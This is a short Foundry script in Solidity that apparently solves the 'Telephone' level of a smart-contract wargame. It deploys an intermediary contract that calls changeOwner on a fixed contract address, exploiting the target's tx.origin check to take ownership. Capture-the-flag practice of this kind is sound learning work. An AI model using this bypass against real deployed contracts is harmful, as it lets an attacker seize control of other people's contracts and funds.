// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level4.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Run {
    Telephone tele;
    constructor(Telephone _tele) {
        tele = _tele;
    }
    function go() public {
        tele.changeOwner(0xBD008DB3d8704Ce124fcd13E448E950B409e07E1);
    }
}

contract TelephoneSolution is Script {
    Telephone public telephoneInstance =
        Telephone(0x08F3ED6b9b1d1f7473C8cbCF1C151187b9CaeEC3);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Run runInstance = new Run(telephoneInstance);
        runInstance.go();
        vm.stopBroadcast();
    }
}
